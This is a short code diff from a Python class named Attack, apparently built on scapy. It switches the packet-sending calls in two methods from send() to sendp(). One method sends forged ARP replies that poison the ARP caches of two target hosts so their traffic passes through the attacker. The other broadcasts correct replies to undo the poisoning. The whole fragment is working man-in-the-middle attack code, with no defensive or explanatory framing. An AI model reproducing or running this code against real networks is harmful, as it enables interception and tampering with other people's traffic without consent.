@@ -45,13 +45,13 @@ class Attack(object):
         self.interface = interface
 
     def send_Poison(self, MACs):
-        send(ARP(op=2, pdst=self.target1, psrc=self.target2, hwdst=MACs[0]), iface=self.interface)
-        send(ARP(op=2, pdst=self.target2, psrc=self.target1, hwdst=MACs[1]), iface=self.interface)
+        sendp(ARP(op=2, pdst=self.target1, psrc=self.target2, hwdst=MACs[0]), iface=self.interface)
+        sendp(ARP(op=2, pdst=self.target2, psrc=self.target1, hwdst=MACs[1]), iface=self.interface)
 
     def send_Fix(self, MACs):
-        send(ARP(op=2, pdst=self.target1, psrc=self.target2, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=MACs[0]),
+        sendp(ARP(op=2, pdst=self.target1, psrc=self.target2, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=MACs[0]),
              iface=self.interface)
-        send(ARP(op=2, pdst=self.target2, psrc=self.target1, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=MACs[1]),
+        sendp(ARP(op=2, pdst=self.target2, psrc=self.target1, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=MACs[1]),
              iface=self.interface)
 
 
